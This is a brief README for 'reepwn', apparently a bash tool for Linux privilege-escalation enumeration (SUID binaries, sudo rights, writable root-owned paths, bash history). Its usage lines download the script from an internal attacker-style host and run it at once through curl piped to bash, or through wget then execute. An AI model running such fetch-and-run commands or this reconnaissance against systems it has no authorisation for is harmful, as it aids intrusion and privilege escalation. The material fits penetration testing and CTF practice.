# reepwn
A bash script used for security-orientated Linux enumeration  
  
Inspired by: [LinEnum](https://github.com/rebootuser/LinEnum)

Features
--------
- OS Detection
- Bash History listing
- SUID things you can run owned by root (https://gtfobins.github.io/)
- Useful /etc/passwd people (uid 0, 500, 501, 502, 1000, 1001, 1002, 2000, 2001, 2002)
- Sudo permissions
- POSIX permissions
- Finding important log files you can see
- Finding root owned directories that you can write to
- Finding root owned directories that your group can access
- Finding root owned files that you can edit

Usage
-----

curl http://10.10.10.1:1234/reepwn.sh | bash

or

wget http://10.10.10.1:1234/reepwn.sh && chmod +x ./reepwn.sh && ./reepwn.sh
